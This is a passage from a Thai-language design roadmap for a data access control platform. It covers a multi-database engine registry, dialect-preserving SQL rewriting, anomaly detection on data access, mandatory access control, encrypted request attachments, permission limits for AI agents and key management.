| `engine_capability` | ความสามารถต่าง engine เป็น **data** (ตอนนี้ 25 แถว: POSTGRES 12 / SQLSERVER 13) |
| `CredentialResolver` | แยกตาม scheme ไม่ใช่ตาม engine |
| catalog / `asset_facet` | อิง FQN ล้วน |

**ส่วนที่ hardcode อยู่ — นับได้ 14 จุด**

| ไฟล์ | บรรทัด | อาการตอนเพิ่ม engine |
|---|---|---|
| `V1__catalog.sql` | 12 | `CHECK (engine IN ('POSTGRES','SQLSERVER'))` |
| `V4__enforcement.sql` | 37 | `CHECK` ตัวเดียวกันอีกชุด |
| `DataSourceStore.Engine` | 41-44 | enum — **อันนี้ดี** compiler จะชี้ให้เองว่าต้องแก้ที่ไหน |
| `JdbcTargets` | 34-50 | switch สร้าง JDBC URL + ข้อความ `"Phase 1 can only connect to..."` |
| `SourceProbe` | 108-127 | switch + probe SQL ต่อ engine |
| `QueryService.dialectFor()` | 425-428 | `new PostgresDialect()` ตรงๆ ไม่มี registry |
| `JdbcIntrospector` | — | `information_schema` ต่างกันแต่ละเจ้า |
| frontend 6 ไฟล์ | — | `sources.ts` · `SourcesPage.tsx` · `PolicyBuilderPage.tsx` · `enforcement.ts` · `widgets.tsx` · test |

⚠️ **จุดที่อันตรายจริงคือ 3 switch นั้น** — ลืมจุดเดียว**ไม่ error ตอน compile**
แต่ไปพังตอน runtime ด้วยข้อความที่โกหกว่า *"Phase 1 ต่อได้แค่ POSTGRES กับ SQLSERVER"*
ทั้งที่ความจริงคือเราลืมเติม case

**สิ่งที่จะทำ — `SourceEngine` registry ตัวเดียว**

1. `SourceEngine` (interface ใน `dac-common` หรือ `dac-connector-source`) ถือของที่เป็นของ
   engine นั้นทั้งหมดไว้ที่เดียว:
   - `id()` · `displayName()`
   - `jdbcUrl(JdbcTarget)` + `driverClassName()`
   - `dialect()` → `SqlDialect`
   - `probeStatement()` · `readOnlySetup(Connection)`
   - `introspection()` → ตัวอ่าน `information_schema` ของเจ้านั้น
   - `defaultPort()` · `supportsSchemas()` (MySQL ไม่มีชั้น schema แยกจาก database — เป็น
     ความต่างเชิงโครงสร้าง ไม่ใช่แค่ syntax ต้องเผื่อไว้ตั้งแต่ตอนออกแบบ interface)
2. `SourceEngines.of(engineId)` เป็นทางเข้าเดียว — `JdbcTargets`, `SourceProbe`,
   `QueryService.dialectFor()`, `JdbcIntrospector` เลิกมี switch ของตัวเอง
3. **ย้าย `CHECK (engine IN (...))` เป็นตาราง reference `source_engine`** + FK
   → เพิ่ม engine = insert แถว ไม่ใช่เขียน migration แก้ constraint
   (ตาราง `engine_capability` อ้าง FK เดียวกัน)
4. **Frontend อ่านรายการ engine จาก API** (`GET /v1/sources/engines`) แทนที่จะ hardcode
   6 ไฟล์ → หน้า Register a source กับ Policy Builder ได้ตัวเลือกใหม่เองโดยไม่ต้อง deploy FE
5. **test ที่บังคับความครบ** — วนทุก engine ที่ registry รู้จัก แล้วยืนยันว่ามี
   dialect / probe / url template / capability rows ครบ **test นี้คือของที่ทำให้
   "ลืมจุดเดียว" กลายเป็น compile-time problem แทน production problem**

**ลำดับที่ถูกต้อง: ทำ M18 ก่อนเพิ่ม engine ตัวที่สาม ไม่ใช่หลัง**
ถ้าเพิ่ม MySQL ไปก่อนแล้วค่อยมา refactor จะต้อง refactor ของ 3 engine พร้อมกัน
และตอนนั้นจะมี 21 จุดแทนที่จะเป็น 14

**ของที่ยังไม่ต้องรีบ** — `SqlDialect` ตอนนี้พอสำหรับ engine ตระกูล SQL
แต่ถ้าวันหนึ่งต้องต่อของที่ไม่ใช่ SQL (Elasticsearch, MongoDB, REST API) `SqlDialect`
จะไม่พอ ต้องยก abstraction ขึ้นไปอีกชั้นเป็น "compiler ต่อ target type"
**ยังไม่ต้องทำตอนนี้** แต่ `SourceEngine` ควรถูกออกแบบให้ `dialect()` เป็น optional
ตั้งแต่แรก จะได้ไม่ต้องรื้อรอบสอง

### AP.7a M18 ฝั่ง proxy — **ทำไมเราไม่ทำแบบ Denodo (normalize ลง ANSI SQL)**

> `ต้องออกแบบให้ต่อได้หลาย database type ในอนาคตนะ สำหรับวิธีการ Proxy ปรับมาทำส่วนนี้ก่อนเลย เพื่อสร้างฐานให้แข็งแรง`
> `ได้ยินมาว่า Denodo ใช้ ASCII เลยหรอ เราต้องทำขนาดนั้นไหม หรือมี technique ที่ดีกว่า`

**"ASCII" ที่ได้ยินมาน่าจะเป็น ANSI (SQL)** — Denodo มีภาษาของตัวเอง (**VQL**) และ normalize
ทุก query ลง relational algebra กลาง แล้วให้ adapter แต่ละตัวประกาศ **delegation capability**
ว่า push down อะไรได้ ส่วนที่ push down ไม่ได้ **ถูกดึงขึ้นมารันในเอนจินของ Denodo เอง**

**เขาต้องทำแบบนั้นเพราะเขา join ข้าม source เรา *ไม่* join ข้าม source** — หนึ่ง query ไปหนึ่ง
source เสมอ พอไม่ federate ภาษากลางก็ไม่มีประโยชน์ แถมมีโทษ 3 ข้อ:

| โทษ | อธิบาย |
|---|---|
| **ปฏิเสธ SQL ที่ถูกต้องของ user** | `SELECT TOP 10` · `[bracket]` · `::cast` · `ILIKE` — คนเขียน syntax ของ engine ตัวเอง การ normalize ลง ANSI คือการบอกว่า "SQL ที่คุณเขียนถูกแต่เราไม่รับ" |
| **จุดที่ semantic เพี้ยนได้** | normalize แล้ว render กลับ = แปลสองรอบ และการเพี้ยนของเรา**ไม่ใช่ query พัง** แต่คือ **mask หลุด** ซึ่งเป็นความผิดพลาดชนิดที่เงียบ |
| **พาไปสู่การดึงข้อมูลขึ้นมากรองบนแอป** | ทางที่ ANSI พาไปคือ *"อันนี้แปลไม่ได้ ดึงขึ้นมาทำเองดีกว่า"* ซึ่งขัดกับคำตอบที่ให้ผู้ใช้ไว้ตรงๆ ว่า **เราแปลเป็น syntax ปลายทางแล้ว push down ไม่เคยดึงทั้งก้อนขึ้นมา** |

**เทคนิคที่เลือกแทน — dialect-preserving rewrite + capability-declared fail-closed**

```
parse ด้วย grammar ของ engine นั้น (ไม่แปลงเป็นภาษากลาง)
  → resolve table ref  → PolicyEngine → PolicyDecision
  → แทนเฉพาะ FROM node + projection   (AST ส่วนที่เหลือไม่ถูกแตะเลย)
  → unparse กลับด้วย dialect เดิม
  → ถ้า dialect นั้นเขียน mask ตัวที่ decision สั่งไม่ได้ → ปฏิเสธทั้ง query (fail-closed)
```

ผลคือ **พื้นที่ที่ engine-specific เหลือแค่ 2 อย่าง และทั้งสองอย่างถูกประกาศไว้เป็นของที่จับต้องได้**
— `SqlDialect` (วิธีเขียน mask / quote / cast) กับ `engine_capability` (ทำอะไรได้ ไม่ได้)
นี่คือแนวคิด delegation capability ของ Denodo **โดยไม่ต้องแบกเอนจินของเขา**

⚠️ **ข้อที่ห้ามลืมตอน implement:** `engine_capability` ปัจจุบันถูกใช้เตือนตอน *apply* ของ M5/M6
แต่ฝั่ง proxy **ยังไม่มีใครถามมันเลย** — `QueryService` สมมติ PostgresDialect ตรงๆ
(`dialectFor():425-428`) แปลว่าวันที่ต่อ engine ที่เขียน mask บางตัวไม่ได้ proxy จะ**เงียบ**
ไม่ใช่ปฏิเสธ ซึ่งคือ mask หลุด **การเชื่อม capability เข้ากับ proxy คือหัวใจของสไลซ์นี้
ไม่ใช่ของแถม**

**ถ้าวันหนึ่งต้อง join ข้าม source จริงๆ** ค่อยใส่ **Calcite** เป็นชั้น federation ตอนนั้น
(Calcite ให้ ANSI-normalize + per-dialect unparse มาในกล่องอยู่แล้ว) สิ่งที่ต้องระวัง**ตอนนี้**
คือ **อย่าออกแบบอะไรที่ปิดทางนั้น** — ซึ่ง `SourceEngine` registry เปิดทางไว้พอดี เพราะ
federation layer ในอนาคตก็จะถาม registry ตัวเดียวกันว่า engine ปลายทางทำอะไรได้บ้าง

### AP.9 M19 — AI-Driven Anomalous Access Detection (ผู้ใช้ขอ 2026-09-25)

ผู้ใช้สั่ง *"ทำเป็น Roadmap หน่อย"* พร้อมข้อความที่ก๊อปมา ใจความคือ: ใช้ AI / ML ตรวจพฤติกรรมการเข้าถึงข้อมูลที่ผิดปกติ
โดยเรียนรู้พฤติกรรมปกติของพนักงานแต่ละคน (baseline) เช่น *ปกติดึงข้อมูลลูกค้าวันละ 10 รายชื่อ แต่วันหนึ่งสั่งดึง 5,000 รายชื่อตอนตี 3*
แล้วให้ระบบ **block ทันทีและแจ้งทีม security**
(คำถามท้ายข้อความที่ก๊อปมา เช่น ใช้กับฐานข้อมูลประเภทไหน หรือโจทย์ใหญ่คืออะไร เป็นคำถามจากแหล่งที่ก๊อปมาถึงผู้ใช้
ไม่ใช่งานของเรา · ข้อนี้ออกแบบจากบริบทของ ARAK ตอนนี้: PostgreSQL + SQL Server · ผ่าน proxy 5.2 · โมเดลสิทธิ์ของ M3)

**1. สิ่งที่มีอยู่แล้วและใช้เป็น baseline ได้**
- `audit_query` — ใคร · เมื่อไหร่ · source · SQL ต้นฉบับ / หลัง rewrite · outcome · `row_count` · `duration_ms`
  (**ยังไม่รู้ว่า query แตะ table ไหน** → M10 เพิ่ม `audit_query.asset_fqns` ให้ ต้องทำก่อน)
- `audit_decision` — ใคร · table ไหน · allow / deny · policy ที่ match · purpose
- `access_grant` / `access_request` — สิทธิ์มาจากไหน และขอไว้เพื่ออะไร
- facet ของ table (`classifications` เช่น PII) — ใช้ถ่วงน้ำหนักความเสี่ยง: 5,000 แถวจาก table PII ไม่เท่ากับ 5,000 แถวจาก lookup table

**2. Baseline ต่อคน (และต่อคน × table)** — คำนวณซ้ำทุกคืนจาก 30–90 วันย้อนหลัง
| สัญญาณ | ตัวอย่างที่จับได้ |
|---|---|
| ปริมาณแถวต่อ query และต่อวัน | ปกติ 10 แถว/วัน → วันนี้ 5,000 |
| ช่วงเวลาที่ใช้งาน (histogram 24 ชั่วโมง × วันธรรมดา/วันหยุด) | ไม่เคย query หลัง 20:00 → ตี 3 |
| table ที่แตะ | แตะ table PII ที่ไม่เคยแตะมาก่อน · จำนวน table ต่อวันกระโดด (กวาดหลาย table) |
| อัตราโดนปฏิเสธ | โดน deny ติดกันหลายครั้งใน 10 นาที = ไล่ลองหาช่อง |
| รูปแบบ SQL | `SELECT *` ไม่มี `WHERE` บน table ใหญ่ ทั้งที่ปกติ query แบบมีเงื่อนไข |
| peer group | เทียบกับคนใน team / department เดียวกัน สำหรับคนใหม่ที่ยังไม่มีประวัติ |

**3. วิธีจับ — เรียงจากง่ายไปยาก**
- **v1 สถิติที่อธิบายได้** (ไม่ต้องใช้ ML library) — robust z-score (median / MAD) · ชั่วโมงที่ความถี่ในอดีตต่ำกว่าเกณฑ์ ·
  table ใหม่ + มี classification อ่อนไหว · รวมเป็น **risk score 0–100** พร้อมรายการเหตุผลทีละข้อ
  (ทำนองเดียวกับ explainability ของ FR-5.4: ต้องตอบได้ว่า block เพราะอะไร ไม่ใช่ "AI บอกว่าแปลก")
- **v2 ML** — Isolation Forest / clustering ต่อ peer group รันแบบ offline ทุกคืน ใช้เป็นสัญญาณเสริม ไม่ใช่ตัวตัดสินเดี่ยว
- **LLM (ต่อจาก M11 / M15)** — ใช้**เขียนสรุปเหตุผลให้ security อ่าน**เท่านั้น ส่งให้แค่ตัวเลขสรุปกับ metadata
  (ไม่ส่งข้อมูลจริงหรือผลลัพธ์ query — ตามกฎเดิม *LLM sees metadata only*) และ **LLM ไม่มีสิทธิ์สั่ง block หรือปลด block เอง**

**4. จังหวะที่ตรวจ และทำอะไรได้ในแต่ละโหมด enforcement**
| จังหวะ | ทำได้ใน | เช็คอะไร |
|---|---|---|
| **ก่อนรัน** (ใน `QueryService.run` หลัง rewrite ก่อน execute) | proxy 5.2 | เวลา · table ที่แตะ · SQL ไม่มี `WHERE` · จำนวนแถวที่ขอ (`maxRows`) · ความถี่ของคนนี้ในชั่วโมงนี้ |
| **หลังรัน ก่อนส่งผลกลับ** | proxy 5.2 | จำนวนแถวที่ได้จริง — **รู้แล้วแต่ผลยังไม่ออกจาก ARAK จึงยังกันไว้ได้** |
| **ย้อนหลัง** (job ทุก 5–15 นาที) | ทุกโหมด รวม native 5.1.1 / 5.1.2 | ผลรวมทั้งวัน · หลาย query เล็กๆ ที่รวมกันแล้วผิดปกติ (หลบเกณฑ์ต่อ query) |

> ⚠️ **"block ทันที" ทำได้จริงเฉพาะทาง proxy** · ใน native mode คน query ตรงเข้า database ARAK ไม่ได้อยู่ในเส้นทาง
> จึงทำได้แค่จับจาก log ของ source ทีหลัง แล้วพักสิทธิ์ (REVOKE ผ่านกลไก grant ที่มีอยู่) · ต้องบอกผู้ใช้ตรงๆ ไม่ขายเกินจริง
> (สอดคล้องกับ FR-6.3.1 — ถ้ายังมีคนต่อ database ตรงได้ ตัวตรวจนี้ก็ถูกเลี่ยงได้เช่นกัน)

**5. ระดับการตอบสนอง** (ตั้งได้ต่อ policy / classification / source — ไม่ใช่ค่าเดียวทั้งองค์กร)
1. **ALERT** — ปล่อยผ่าน แต่ขึ้นใน inbox ของ security พร้อม risk score และเหตุผล
2. **STEP_UP** — หยุดไว้ก่อน ให้ผู้ใช้กรอกเหตุผล หรือส่งเป็น access request ให้ owner อนุมัติ
   (ใช้ flow ของ M9 / M13 ที่มีแล้ว: ปุ่มขอสิทธิ์ · workflow หลายขั้น · กระดิ่งแจ้งเตือน)
3. **BLOCK** — ปฏิเสธ query นี้ **และพักสิทธิ์ใช้ query ของคนนี้ไว้** จนกว่า security จะปลด (มีเหตุผล + audit)
   บันทึกเป็น `REJECTED` ใน `audit_query` พร้อม `reject_reason` ที่บอกว่าเป็น anomaly block — ไม่ใช่ policy deny

**6. ข้อที่ต้องออกแบบให้ถูกตั้งแต่แรก**
- **shadow mode ก่อนเสมอ** — ช่วง 14–30 วันแรก คำนวณ score และแจ้งเตือนอย่างเดียว ยังไม่ block
  เพราะการ block คนทำงานจริงผิดตัว (เช่น ช่วงปิดงบสิ้นเดือนที่ทุกคนทำงานดึก) แพงกว่าการปล่อยหลุดหนึ่งครั้ง · มีหน้าจอดูว่าถ้าเปิด block จะโดนกี่ครั้ง
- **ถ้าตัวตรวจล่ม ห้ามทำให้ query ทั้งองค์กรพัง** — policy engine ยังเป็นตัวตัดสินหลัก · ตัวตรวจนี้เป็นชั้นเสริม ·
  เลือกได้ต่อ classification ว่าจะ fail-open หรือ fail-closed (table PII อาจเลือก fail-closed)
- **baseline เองก็เป็นข้อมูลส่วนบุคคลของพนักงาน** (PDPA) — จำกัดคนเห็นหน้า anomaly ไว้ที่ security / auditor ·
  มี retention · ห้ามโชว์ `client_ip` ใน response เหมือนกฎเดิมของทุก audit table
- **role ใหม่ `SECURITY_ANALYST`** — ตอนนี้มีแค่ PLATFORM_ADMIN / POLICY_AUTHOR / DATA_OWNER / AUDITOR / REQUESTER
  ต้องมีคนที่ปลด block ได้แต่ไม่ได้เขียน policy (separation of duty ตาม FR-2.6)
- **คนที่ถูก block ต้องรู้ว่าต้องทำอะไรต่อ** — ข้อความบอกว่าโดนพักเพราะพฤติกรรมผิดปกติและติดต่อใคร
  แต่**ไม่บอกเกณฑ์ตัวเลข** (ไม่งั้นรู้ว่าต้องดึงทีละ 4,999 แถว)
- **การแจ้งเตือนออกนอกระบบ** (email / Teams) ใช้ช่องทางเดียวกับที่ M9 ยังค้างอยู่ — ทำครั้งเดียวใช้ร่วมกัน

**7. แบ่ง slice**
| slice | งาน |
|---|---|
| 0 (ทำใน M10) | `audit_query.asset_fqns` + query log API / หน้าจอ — ฐานข้อมูลของทุกอย่างข้างล่าง |
| 1 | `access_baseline` (ต่อคน และต่อคน × table) + job คำนวณทุกคืน + หน้าดู baseline ของคนหนึ่งคน |
| 2 | risk score + เหตุผล · ตรวจย้อนหลังทุก 15 นาที · inbox ของ security · **shadow mode** |
| 3 | ตรวจใน proxy ก่อนรัน / หลังรันก่อนส่งผล · STEP_UP ผ่าน flow ของ M9 · BLOCK + พักสิทธิ์ + ปลดโดย `SECURITY_ANALYST` |
| 4 | peer group + ML offline · LLM สรุปเหตุผล (ต่อ M15) · email / Teams |

### AP.10 M20 — MAC เต็มรูปแบบ และสถานะของ access control model ทั้ง 4 แบบ (ผู้ใช้ถาม 2026-09-25)

ผู้ใช้ส่งนิยาม DAC / MAC / RBAC / ABAC มาแล้วถามว่า *"พวกนี้มีครบไหม"* · ตรวจจากโค้ดจริง (`subjectRule.json` · `Operators` · `Comparisons` · `GrantStore` · `Stewardship`):

| Model | สถานะ | อยู่ตรงไหน |
|---|---|---|
| **DAC** — owner ตัดสินใจเองว่าใครเข้าได้ | ✅ มี | owner ให้ grant ตรง (`POST /v1/access/grants` · ต้องมี `DATA_OWNER` + scope) · อนุมัติ access request (M9) · **ต่างจาก DAC ทั่วไปตรงที่ owner ให้สิทธิ์ทะลุ policy กลางไม่ได้** (grant ที่ policy ยัง DENY อยู่ถูกปฏิเสธตั้งแต่ตอนให้ — commit `37cbd1c`) |
| **RBAC** — สิทธิ์ผูกกับ role ไม่ใช่ตัวคน | ✅ มี | `principals` (OR) / `requiredPrincipals` (AND) ด้วย `role` · `team` · `group` · `user` · และ `assetOwner` แบบ dynamic |
| **ABAC** — ตัดสินจาก attribute และ context | ✅ มี | `attributes` (eq / in / gte …) · `expression` (เทียบ user กับ asset เช่น `user.country == asset.prop('dataResidency')`) · `time.windows` + `validFrom/To` · `context.ipCidr` / `purpose` |
| **MAC** — ระดับชั้นความลับของข้อมูลเทียบกับ clearance ของคน ส่วนกลางคุม คนอื่นแก้ไม่ได้ | ⚠️ **ได้บางส่วน** | เขียนเป็น ORG-level DENY ได้ (`classifications contains 'PII'` + `clearance lt L2`) · DENY ชนะเสมอ · local policy ผ่อนไม่ได้เว้นแต่เปิด `allowLocalOverride` · owner ให้ grant ทะลุไม่ได้ |

**ช่องว่างของ MAC**
1. `gte` / `lt` เทียบข้อความด้วยการเรียงตัวอักษร (`Comparisons.compare` บรรทัด 59–62) — ใช้ได้กับ `L1 < L2 < L3`
   แต่ `Public < Internal < Confidential < Secret` เรียงผิด (`Confidential` มาก่อน `Internal`) และ `L10` มาก่อน `L2`
2. ระดับชั้นของ table ไม่ใช่ค่าเดียวที่เรียงได้ — เป็นแค่ tag หลายตัว · ยังไม่มีกฎว่า "ระดับของ table = ระดับสูงสุดของ column"
3. ต้องมีคนเขียน policy ถึงจะมี MAC · ไม่มีค่า default ที่เปิดทีเดียวใช้ทั้งองค์กร

**สิ่งที่จะทำ**
- `sensitivity_scheme` — ลำดับระดับที่ admin กำหนด (เช่น `Public=0 · Internal=1 · Confidential=2 · Secret=3`) ผูกกับ classification ใน OpenMetadata
  (อ่านอย่างเดียว ไม่เขียนกลับ OM) · และผูก attribute `clearance` ของคนเข้ากับ scheme เดียวกัน
- operator ใหม่ที่เทียบตามลำดับของ scheme ไม่ใช่ตามตัวอักษร · และตัวแปร `asset.sensitivity` = ระดับสูงสุดของ table และทุก column
- **MAC guardrail ระดับองค์กร** เปิดปิดได้ครั้งเดียว: `user.clearance < asset.sensitivity → DENY` (no read-up) ·
  compose กับ policy อื่นแบบ DENY ชนะ · ไม่มี `allowLocalOverride` · แสดงใน Simulator / explainability ว่าโดน MAC
- ระดับของ column ที่สูงกว่า clearance → mask หรือซ่อน column แทนการ deny ทั้ง table (เลือกได้)
- no-write-down ไม่เกี่ยว เพราะ Phase 1 เป็น read-only

### AP.11 M9 — แนบไฟล์ใน access request เก็บไว้บน server (ผู้ใช้ขอ 2026-09-25)

ผู้ใช้ถาม *"Access Request ต้องใส่ Attach file ด้วยไหม"* แล้วตามด้วย *"เก็บไฟล์ไว้ใน Server"*
→ **ควรมี** เพราะคำขอข้อมูลอ่อนไหวมักต้องมีหลักฐานประกอบ เช่น บันทึกอนุมัติจากหัวหน้า · NDA · แบบประเมิน PDPA / DPIA · ticket
**ไม่บังคับโดย default** · workflow step ตั้งได้ว่า *"ต้องมีไฟล์แนบ"* (เช่นเฉพาะ table ที่มี PII) — อยู่ใน Configure เหมือนตัวเลือกอื่นของ workflow

**การเก็บไฟล์**
- เก็บบน disk ของ server ใต้โฟลเดอร์ที่ config ได้ (`attachments.dir`) · บน prod host ต้องอยู่ใต้ `~/Arak` เท่านั้นและเป็น volume ที่ backup ไปพร้อมฐานข้อมูล
- **ชื่อไฟล์บน disk เป็น UUID** ไม่ใช่ชื่อที่ผู้ใช้ส่งมา (กัน path traversal) · ชื่อเดิมเก็บใน DB ไว้แสดงอย่างเดียว
- ตาราง `access_request_attachment(id, request_id, filename, content_type, size_bytes, sha256, uploaded_by, uploaded_at, storage_key)`
- เข้ารหัสไฟล์ก่อนเขียนลง disk (ไฟล์พวกนี้มักมีข้อมูลส่วนบุคคล) · กุญแจอยู่ใน `.env` เหมือน `FERNET_KEY` ห้าม commit
- จำกัด: ไม่เกิน 10 MB ต่อไฟล์ · 5 ไฟล์ต่อคำขอ · รับเฉพาะ PDF / PNG / JPG / DOCX / XLSX / TXT · **ตรวจจาก magic bytes ไม่ใช่นามสกุล**
- ช่องทางสแกนไวรัส (ClamAV) ไว้เสียบทีหลัง

**ใครดาวน์โหลดได้** — คนขอ · approver ของทุก step ในคำขอนั้น · PLATFORM_ADMIN · AUDITOR · คนอื่นได้ 404 (ไม่บอกว่ามีไฟล์)
- ส่งกลับด้วย `Content-Disposition: attachment` + `X-Content-Type-Options: nosniff` เสมอ · ห้ามเปิดแบบ inline (กัน HTML / SVG ที่มี script)
- **หลังคำขอถูกตัดสินแล้ว ลบหรือเปลี่ยนไฟล์ไม่ได้** เพราะเป็นหลักฐานของการอนุมัติ · ระหว่างที่คำขอยังเปิดอยู่ คนขอเพิ่มไฟล์ได้
- บันทึก audit ทุกการ upload และ download · ห้ามส่ง IP ของผู้ใช้กลับใน response (เหมือนกฎของ V24)

### AP.12 M21 — AI Data Access Control (ผู้ใช้ขอ 2026-09-25)

ผู้ใช้ส่งนิยามมาว่า *AI data access control governs which data an AI model or agent can retrieve, read, or use based on user identity, permissions, and context*
พร้อม feature 6 ข้อ แล้วสั่ง *"พวกนี้มีครบหรือยัง ถ้ายัง ให้ใส่ Roadmap ไว้"* · ตรวจเทียบกับโค้ดจริง:

| Feature | สถานะใน ARAK ตอนนี้ |
|---|---|
| **Runtime Authorization** — ตรวจสิทธิ์ตอนทำงานจริง ไม่ใช่ครั้งเดียวตอนเริ่ม | ✅ ฝั่ง SQL — ทุก statement ผ่าน `DecisionService.decide` ตอนรัน · time window ตรวจ ณ เวลารัน · decision cache ล้างเมื่อ policy / attribute / tag / grant เปลี่ยน · ❌ แต่ยังไม่มีช่องทางให้ AI agent เรียก |
| **Identity Binding & Inheritance** — agent ต้องทำงานในนาม user ที่ยืนยันตัวแล้ว และได้สิทธิ์ไม่เกิน user | ⚠️ `POST /v1/query` รันในนามคนที่ login อยู่ · แต่**ไม่มี delegated token** ให้ agent ทำแทน user · Org Key ของ M14 ผูกกับ principal เดียว จึงยังไม่ใช่ on-behalf-of |
| **Granular Filtering (Row / Column)** — กรองก่อนข้อมูลเข้า context ของ LLM | ✅ row filter + mask + hidden column ใน SQL rewrite · ❌ ไม่รองรับ vector chunk / RAG |
| **Automated Classification** — จัดหมวดข้อมูลอ่อนไหวและติด label ที่กำหนด retention / การดึง | ⚠️ ใช้ classification จาก OpenMetadata (รวม auto-classification ของ OM — ตั้งใจไม่เขียนตัวจัดหมวดเอง) · ❌ ยังไม่มี retention / retrieval limit ตาม label (ต่อกับ M20) |
| **Dynamic Redaction & Masking** — ซ่อนค่าอ่อนไหวใน prompt / output / citation แบบ real time | ✅ mask ในผลลัพธ์ query · ❌ ยังไม่ redact ใน prompt / output ของ LLM (ตอนนี้ LLM ของ ARAK เห็นแค่ metadata จึงไม่มีข้อมูลจริงเข้า prompt แต่ข้อความที่ผู้ใช้พิมพ์เองอาจมี PII) |
| **Centralized Policy Enforcement** — คุม credential, gateway traffic และสิทธิ์ของ tool ที่เดียวทุก AI workload | ⚠️ credential ของ source ถูกปิดผนึก (Fernet / vault) · LLM gateway ต่อคน + kill switch (`allow_personal`) · ❌ ยังไม่มีสิทธิ์ระดับ tool ของ agent และยังไม่มี gateway กลางสำหรับ AI workload |

**สิ่งที่จะทำ (แบ่ง slice)**
| slice | งาน |
|---|---|
| 0 | ต้องมี **M14** (public API + OpenAPI) ก่อน — agent เรียก ARAK ผ่าน API ชุดเดียวกับระบบอื่น |
| 1 **Agent registry** | principal ชนิด `AGENT` มี owner · วันหมดอายุบังคับ · kill switch · tool ที่อนุญาต · **เพดานสิทธิ์** เช่น ห้ามเห็น classification `Secret` แม้ user จะเห็นได้ · **สิทธิ์ของ agent = สิทธิ์ของ user ∩ เพดานของ agent** เสมอ ไม่มีทางมากกว่า user |
| 2 **Delegated token** | OAuth 2.0 Token Exchange (RFC 8693) — agent แลก token ของ user เป็น token อายุสั้น (5–15 นาที) ที่มี claim `act` บอกว่า agent ตัวไหนทำแทนใคร · **ARAK ปฏิเสธการเรียกของ agent ที่ไม่มี user อยู่เบื้องหลัง** · audit เขียนว่า "agent X ในนามของ Y" ทุกแถว |
| 3 **ARAK MCP server** | tool: `search_assets` · `describe_asset` · `run_query` · `request_access` (ร่างคำขอเท่านั้น user ต้องกดส่งเอง) · ทุกการเรียก tool = runtime authorization ใหม่ · row cap ของ agent ต่ำกว่าคน · ผลลัพธ์ผ่าน mask / RLS ชุดเดียวกับ proxy |
| 4 **Purpose `ai-agent`** | ส่ง `purpose = ai-agent` เข้า decision ทุกครั้งที่เป็น agent → ใช้ `context.purpose` ของ ABAC ที่มีอยู่แล้วเขียน policy ได้ทันที เช่น *"mask PII เมื่อเป็น AI แม้คนคนนั้นจะเห็นได้เอง"* · ไม่ต้องสร้าง engine ใหม่ |
| 5 **AI output guard** | ตรวจ PII ใน prompt ขาออกจาก LLM gateway และในคำตอบของ model (เลขบัตรประชาชนไทยที่ checksum ถูก · เบอร์โทร · email · บัตรเครดิตที่ผ่าน Luhn) → redact หรือ block ตาม policy · citation ที่อ้างถึง column ที่ถูก mask ต้องโชว์ค่าที่ mask แล้วเท่านั้น |
| 6 **Filter สำหรับ vector store / RAG** | ARAK ไม่เก็บ vector เอง · เปิด API ให้ retriever ถามว่า user คนนี้ดึง chunk จาก asset / column ไหนได้บ้าง พร้อม row predicate เป็น metadata filter (**pre-filter ก่อนค้น** ไม่ใช่กรองทีหลัง) · chunk ต้องติด FQN ของต้นทางและรับ classification ตกทอดมา |
| 7 **Retention / retrieval limit ตาม label** | ต่อกับ sensitivity scheme ของ M20 — เช่น label `Secret` ห้ามเข้า context ของ LLM ภายนอกเลย |
| 8 **Anomaly ของ agent** | ใช้ baseline ของ M19 แยกต่อ agent (agent ยิงถี่กว่าคนมาก เกณฑ์ต้องแยก) |

**กฎที่ต้องคงไว้** — LLM ไม่มีสิทธิ์เปิดใช้ policy เอง (เดิม) · LLM ภายใน ARAK เห็นแค่ metadata (เดิม) ·
agent ขยายสิทธิ์ตัวเองไม่ได้ · คำขอสิทธิ์ที่ agent ร่างเป็นแค่ร่างจนกว่า user จะกดส่ง · ห้ามส่ง `client_ip` กลับใน response

### AP.13 M22 — Encryption / Decryption ของข้อมูล (ผู้ใช้ถาม 2026-09-25)

ผู้ใช้ถาม *"มีระบบ Encryption Decryption ไหม ใน Roadmap"* → ตรวจจากโค้ดแล้ว **มีแค่ส่วนที่ปกป้องความลับของ ARAK เอง ยังไม่มีการเข้ารหัส / ถอดรหัสตัวข้อมูล** และใน Roadmap เดิมมีแค่คำว่า "FPE" ในรายการ Phase 2 ไม่มี milestone รองรับ

| เรื่อง | สถานะ | อยู่ตรงไหน |
|---|---|---|
| credential ของ source · LLM API key | ✅ | `SecretBox` (Fernet · `FERNET_KEY` ใน `.env`) · `fernet:` reference · `api_key_cipher` ไม่ถูกส่งกลับ |
| ต่อ source แบบเข้ารหัส (in transit) | ⚠️ บางส่วน | MSSQL `encrypt=true;trustServerCertificate=true` (ยังไม่ตรวจ cert) · PG ยังไม่บังคับ `sslmode` |
| Vault / Azure Key Vault | ⚠️ รับ reference แต่ใช้ไม่ได้ | `CredentialResolver` ตอบว่า "No vault client is configured" |
| หมุนกุญแจ (key rotation) | ❌ | `FERNET_KEY` มีได้ตัวเดียว · เปลี่ยนแล้ว credential เดิมเปิดไม่ออก |
| mask แบบทางเดียว | ✅ | `HASH` (SHA-256 + salt ต่อ column) · `PARTIAL` · `REGEX_REPLACE` · `NULLIFY` … — ถอดกลับไม่ได้โดยตั้งใจ |
| ถอดรหัส column ที่ source เข้ารหัสเก็บไว้ ให้เฉพาะคนที่มีสิทธิ์ | ❌ | — |
| tokenization / FPE แบบย้อนกลับได้ | ❌ | มีแค่ชื่อในรายการ Phase 2 |
| ไฟล์แนบของ M9 | ⬜ วางแผนแล้ว | ข้อ AP.11 — เข้ารหัสก่อนเขียนลง disk |

**สิ่งที่จะทำ (เรียงตามลำดับ)**
1. **Key management ก่อนอย่างอื่น** — keyring หลายรุ่น (`FERNET_KEYS` = ตัวใหม่อยู่หน้า · ตัวเก่ายังเปิดได้) · คำสั่ง re-seal credential ทุกตัวด้วยกุญแจใหม่ ·
   Vault / Azure Key Vault client จริงหลัง `vault://` / `azurekeyvault://` · envelope encryption (DEK ต่อ source / ต่อ column ห่อด้วย KEK ใน KMS) · **กุญแจไม่เคยอยู่ใน DB หรือ git**
2. **Decrypt-on-read ตาม policy** — column ที่ source เก็บเป็น ciphertext อยู่แล้ว (เช่น app เขียนด้วย AES-GCM หรือ `pgcrypto`) ติด label ใน ARAK ว่าเข้ารหัสด้วย key ไหน ·
   data policy ได้ action ใหม่ `DECRYPT` (ALLOW ให้เห็น plaintext) · คนที่ไม่ได้สิทธิ์เห็น ciphertext หรือค่าที่ mask ต่อ ·
